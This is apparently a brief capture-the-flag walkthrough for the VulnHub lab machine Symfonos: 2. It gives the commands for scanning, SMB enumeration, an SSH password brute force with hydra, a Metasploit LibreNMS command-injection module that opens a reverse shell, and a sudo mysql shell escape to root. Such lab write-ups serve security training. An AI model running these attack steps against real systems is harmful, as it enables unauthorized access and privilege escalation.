
# Symfonos: 2 Walkthrough

**VulnHub Link:** [Symfonos: 2](https://www.vulnhub.com/entry/symfonos-2,331/)
**Difficulty:** Easy
**Release Date:** 18 Jul 2019


## 1. Reconnaissance
	
	nmap -O -T4 -A -P -sV 192.168.100.126



## 2. Enumeration
	
	enum4linux 192.168.100.126 
	aeolus and cronus users found.!
	
	smbmap -H '192.168.100.126' -u '' -p ''
	smbclient //192.168.100.126/anonymous 



## 3. Brute Force
	
	hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.126 -I
	or another brute force tool as you wish

	aeolus password found --> sergioteamo
		
	ssh -L 8080:localhost:8080 aeolus@192.168.100.126
	
	then --> librenms website opened.



## 4. Exploitation
	
	msfconsole -q
	use /linux/http/librenms_addhost_cmd_inject

	setting options correctly (RHOSTS 127.0.0.1,RPORT 8080,LHOST wlan0 or eth0,LPORT 4444)
	
	crunus user's shell opened 


## 5. Privilege Escalation
	
	sudo -l --> /usr/bin/mysql can be run as root
	sudo ./mysql -e '\! /bin/sh' 
	
	AND BINGO..! 
	
	Root flag captured..!

		

